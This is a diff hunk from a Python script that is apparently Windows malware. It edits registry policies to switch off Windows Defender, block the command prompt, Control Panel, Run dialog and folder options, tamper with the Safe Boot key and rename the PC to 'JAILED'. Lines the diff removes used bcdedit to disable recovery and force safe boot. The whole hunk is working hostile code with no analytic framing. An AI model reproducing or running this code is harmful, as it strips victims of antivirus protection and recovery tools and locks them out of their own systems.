@@ -13,32 +13,55 @@ def invert():
         pass
 
 def disable_safe_mode():
-    try:
-        reg_key = winreg.HKEY_CURRENT_USER
-        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
-        try:
-            reg_key_handle = winreg.OpenKey(reg_key, reg_path, 0, winreg.KEY_WRITE)
-        except FileNotFoundError:
-            reg_key_handle = winreg.CreateKey(reg_key, reg_path)
-        winreg.SetValueEx(reg_key_handle, "NoFileAssociate", 0, winreg.REG_DWORD, 1)
-        winreg.SetValueEx(reg_key_handle, "NoControlPanel", 0, winreg.REG_DWORD, 1)
-        winreg.SetValueEx(reg_key_handle, "HideClock", 0, winreg.REG_DWORD, 1)
-        winreg.SetValueEx(reg_key_handle, "NoFolderOptions", 0, winreg.REG_DWORD, 1)
-        winreg.SetValueEx(reg_key_handle, "DisableCMD", 0, winreg.REG_DWORD, 1)
-        winreg.SetValueEx(reg_key_handle, "NoRun", 0, winreg.REG_DWORD, 1)
-        winreg.CloseKey(reg_key_handle)
-
-        reg_key = winreg.HKEY_LOCAL_MACHINE
-        reg_path = r"SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal"
-        try:
-            reg_key_handle = winreg.OpenKey(reg_key, reg_path, 0, winreg.KEY_WRITE)
-        except FileNotFoundError:
-            reg_key_handle = winreg.CreateKey(reg_key, reg_path)
-        winreg.SetValueEx(reg_key_handle, "Minimal", 0, winreg.REG_SZ, "")
-        winreg.CloseKey(reg_key_handle)
-
-        subprocess.run("bcdedit /set {default} recoveryenabled no", shell=True, check=True)
-        subprocess.run("bcdedit /set {default} safeboot minimal", shell=True, check=True)
-
-    except Exception:
-        pass
+ try:
+  reg_key=winreg.HKEY_LOCAL_MACHINE
+  reg_path=r"Software\Policies\Microsoft\Windows Defender"
+  try:
+   reg_key_handle=winreg.OpenKey(reg_key,reg_path,0,winreg.KEY_WRITE)
+  except FileNotFoundError:
+   reg_key_handle=winreg.CreateKey(reg_key,reg_path)
+  winreg.SetValueEx(reg_key_handle,"DisableAntiSpyware",0,winreg.REG_DWORD,1)
+  winreg.CloseKey(reg_key_handle)
+  reg_key=winreg.HKEY_LOCAL_MACHINE
+  reg_path=r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
+  try:
+   reg_key_handle=winreg.OpenKey(reg_key,reg_path,0,winreg.KEY_WRITE)
+  except FileNotFoundError:
+   reg_key_handle=winreg.CreateKey(reg_key,reg_path)
+  winreg.SetValueEx(reg_key_handle,"NoStore",0,winreg.REG_DWORD,1)
+  winreg.CloseKey(reg_key_handle)
+  reg_key=winreg.HKEY_CURRENT_USER
+  reg_path=r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
+  try:
+   reg_key_handle=winreg.OpenKey(reg_key,reg_path,0,winreg.KEY_WRITE)
+  except FileNotFoundError:
+   reg_key_handle=winreg.CreateKey(reg_key,reg_path)
+  winreg.SetValueEx(reg_key_handle,"NoFileAssociate",0,winreg.REG_DWORD,1)
+  winreg.SetValueEx(reg_key_handle,"NoControlPanel",0,winreg.REG_DWORD,1)
+  winreg.SetValueEx(reg_key_handle,"HideClock",0,winreg.REG_DWORD,1)
+  winreg.SetValueEx(reg_key_handle,"NoFolderOptions",0,winreg.REG_DWORD,1)
+  winreg.SetValueEx(reg_key_handle,"DisableCMD",0,winreg.REG_DWORD,1)
+  winreg.SetValueEx(reg_key_handle,"NoRun",0,winreg.REG_DWORD,1)
+  winreg.CloseKey(reg_key_handle)
+  reg_key=winreg.HKEY_LOCAL_MACHINE
+  reg_path=r"SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal"
+  try:
+   reg_key_handle=winreg.OpenKey(reg_key,reg_path,0,winreg.KEY_WRITE)
+  except FileNotFoundError:
+   reg_key_handle=winreg.CreateKey(reg_key,reg_path)
+  winreg.SetValueEx(reg_key_handle,"Minimal",0,winreg.REG_SZ,"")
+  winreg.CloseKey(reg_key_handle)
+ except Exception:
+  pass
+def rename_pc():
+ try:
+  reg_key=winreg.HKEY_LOCAL_MACHINE
+  reg_path=r"SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName"
+  try:
+   reg_key_handle=winreg.OpenKey(reg_key,reg_path,0,winreg.KEY_WRITE)
+  except FileNotFoundError:
+   reg_key_handle=winreg.CreateKey(reg_key,reg_path)
+  winreg.SetValueEx(reg_key_handle,"ComputerName",0,winreg.REG_SZ,"JAILED")
+  winreg.CloseKey(reg_key_handle)
+ except Exception:
+  pass 
